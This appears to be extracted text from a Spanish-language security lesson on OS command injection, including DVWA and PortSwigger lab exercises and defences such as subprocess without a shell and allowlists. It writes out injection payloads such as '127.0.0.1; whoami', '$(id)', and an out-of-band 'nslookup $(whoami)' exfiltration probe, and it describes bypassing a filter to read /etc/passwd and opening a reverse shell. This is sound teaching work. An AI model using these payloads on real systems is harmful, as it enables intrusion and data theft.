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095 — Inyección de comandos del sistema operativo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la inyección de comandos del SO (OS command injection): cuando una aplicación pasa entrada del usuario a un shell del sistema, un atacante puede ejecutar comandos arbitrarios. Es una de las…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puntos donde el input llega a un comando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comandos con metacaracteres del shell (;, |, &amp;&amp;, $()).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command injection ciega con técnicas temporales y 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Estabilizar una shell reversa en un laboratorio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evitar shells y usar APIs seguras como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Cómo el input llega al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Metacaracteres de encadenado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Command injection ciega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Detección temporal y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Reverse shell en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Diferencias Linux/Windows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evitar system(), allowlists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inyección de comandos del sistema operativo es de las vulnerabilidades más graves porque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consecuencia directa es la ejecución de código en el servidor (RCE): el atacante deja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manipular la aplicación y pasa a controlar la máquina que la aloja. Ocurre cuando la aplicación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entrada del usuario y la incorpora a un comando del sistema que ejecuta —por ejemplo,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función que llama a ping, nslookup, convert o cualquier utilidad del sistema pasándole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argumento que viene del usuario—. Si ese argumento no se controla, el atacante añade sus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propios comandos. Es la misma causa raíz que la SQLi —datos que cruzan a un intérprete— pero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 command injection: ejecución de comandos del sistema vía input no sanitizado. Característica: suele acabar en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Metacaracter de shell: símbolo que combina comandos (;, &amp;&amp;, |,   , $()). Característica: rompe el comando previsto.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Blind command injection: no hay output; se infiere por tiempo o interacción externa. Característica: se confirma con sleep o nslookup.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Reverse shell: la víctima conecta de vuelta al atacante. Característica: da control interactivo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 injection: se inyectan flags a un binario, no comandos nuevos. Característica: más sutil pero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Allowlist: lista cerrada de valores permitidos. Característica: defensa robusta frente a blocklists.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de comandos — Entrada del usuario ejecutada como comando del sistema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RCE — Ejecución remota de código; el impacto de esta clase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 del sistema — Intérprete al que llega la entrada sin controlar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Metacaracter — ; &amp;&amp; backtick $() y la barra vertical; encadenan o sustituyen comandos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system() / exec() — Funciones que pasan una cadena a la shell; la causa raíz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ciega — El comando se ejecuta pero no se ve la salida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DVWA (Command Injection) y PortSwigger labs de OS command injection.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editar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netcat para escuchar la reverse shell en tu propia máquina de laboratorio.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Command Injection, envía una IP normal (127.0.0.1) y observa el ping.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un comando: 127.0.0.1; whoami y verifica que se ejecuta.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otros separadores: | id, &amp;&amp; uname -a, $(id).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command injection ciega (sin output), confirma con tiempo: 127.0.0.1; sleep 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Alternativa OOB: 127.0.0.1; nslookup $(whoami).tu-collaborator y observa la interacción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lab aislado, lanza una reverse shell hacia tu netcat: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cada payload, la evidencia y el nivel de acceso obtenido.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metacaracteres distintos y en qué se diferencian al encadenar.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una inyección ciega solo con retardo temporal.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un payload de Linux a su equivalente en Windows (&amp;, %COMPUTERNAME% o %USERNAME%).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command injection y argument injection.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versión segura en Python usando subprocess con lista de argumentos (sin shell=True).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allowlist para un campo que solo debe aceptar una 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ejecución de comandos en DVWA nivel Medium (que filtra algunos caracteres) evadiendo el filtro, y demuestra el acceso listando /etc/passwd.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payload que evade el filtro, la evidencia de lectura de /etc/passwd y la corrección de código que eliminaría la vulnerabilidad.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separador se filtra — Nivel Medium bloquea ;/&amp;&amp;; prueba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salida — Inyección ciega; usa tiempo u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Reverse shell no conecta — Firewall/NAT del lab; revisa IP y puerto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Comando no existe en Windows — Sintaxis distinta; usa comandos nativos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 por latencia — Repite la prueba de sleep varias veces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 tan grave?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ejecutar comandos suele equivaler a controlar el servidor (RCE), el peor escenario posible.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¿shell=True es el problema?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menudo sí. Pasar input a un shell es la causa. Usa APIs que reciban argumentos como lista, sin intérprete de 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¿Escapar caracteres basta?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frágil. Mejor evitar el shell por completo y validar con allowlists estrictas.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9 (OS command injection).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Command Injection: &lt;https://owasp.org/www-community/attacks/CommandInjection&gt;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OS command injection: &lt;https://portswigger.net/web-security/os-command-injection&gt;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93791f6c19345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22092"/>
            <a:ext cx="8229600" cy="1453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